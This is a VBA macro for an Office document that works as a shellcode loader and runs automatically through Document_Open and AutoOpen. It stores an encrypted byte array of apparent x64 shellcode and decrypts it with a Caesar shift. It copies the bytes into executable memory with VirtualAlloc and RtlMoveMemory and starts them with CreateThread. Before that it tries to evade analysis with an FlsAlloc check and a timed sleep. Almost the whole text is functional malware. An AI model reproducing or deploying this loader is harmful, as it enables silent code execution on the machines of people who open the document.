Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long) As LongPtr
Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr
Sub MyMacro()
    Dim allocRes As LongPtr
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    ' Call FlsAlloc and verify if the result exists
    allocRes = FlsAlloc(0)
    If IsNull(allocRes) Then
        End
    End If
    
    ' Sleep for 10 seconds and verify time passed
    t1 = Now()
    Sleep (10000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    If time < 10 Then
        Exit Sub
    End If

    buf = Array(13,89,148,245,1,249,221,17,17,17,82,98,82,97,99,98,89,66,227,103,118,89,156,99,113, _
89,156,99,41,89,156,99,49,94,66,218,89,156,131,97,89,32,200,91,91,89,66,209,189,77, _
114,141,19,61,49,82,210,218,30,82,18,210,243,254,99,89,156,99,49,156,83,77,89,18,225, _
119,146,137,41,28,19,82,98,32,150,131,17,17,17,156,145,153,17,17,17,89,150,209,133,120, _
89,18,225,85,156,81,49,97,156,89,41,90,18,225,244,103,94,66,218,89,16,218,82,156,69, _
153,89,18,231,89,66,209,189,82,210,218,30,82,18,210,73,241,134,2,93,20,93,53,25,86, _
74,226,134,233,105,85,156,81,53,90,18,225,119,82,156,29,89,85,156,81,45,90,18,225,82, _
156,21,153,82,105,89,18,225,82,105,111,106,107,82,105,82,106,82,107,89,148,253,49,82,99, _
16,241,105,82,106,107,89,156,35,250,92,16,16,16,110,90,207,136,132,67,112,68,67,17,17, _
82,103,90,154,247,89,146,253,177,18,17,17,90,154,246,90,205,19,17,18,204,209,185,66,94, _
82,101,90,154,245,93,154,2,82,203,93,136,55,24,16,230,93,154,251,121,18,18,17,17,106, _
82,203,58,145,124,17,16,230,123,27,82,111,97,97,94,66,218,94,66,209,89,16,209,89,154, _
211,89,16,209,89,154,210,82,203,251,32,240,241,16,230,89,154,216,123,33,82,105,93,154,243, _
89,154,10,82,203,170,182,133,114,16,230,150,209,133,27,90,16,223,134,246,249,164,17,17,17, _
89,148,253,33,89,154,243,94,66,218,123,21,82,105,89,154,10,82,203,19,234,217,112,16,230, _
148,9,17,143,102,89,148,213,49,111,154,7,123,81,82,106,121,17,33,17,17,82,105,89,154, _
3,89,66,218,82,203,105,181,100,246,16,230,89,154,212,90,154,216,94,66,218,90,154,1,89, _
154,235,89,154,10,82,203,19,234,217,112,16,230,148,9,17,142,57,105,82,104,106,121,17,81, _
17,17,82,105,123,17,107,82,203,28,64,32,65,16,230,104,106,82,203,134,127,94,114,16,230, _
90,16,223,250,77,16,16,16,89,18,212,89,58,215,89,150,7,134,197,82,16,248,105,123,17, _
106,204,241,46,59,27,82,154,235,16,230)
    
    ' Caesar Decryption Function
    For i = 0 To UBound(buf)
      buf(i) = (buf(i) - 17) And &HFF
    Next i

    ' Allocate memory space
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    ' Move the shellcode
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    ' Execute the shellcode
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub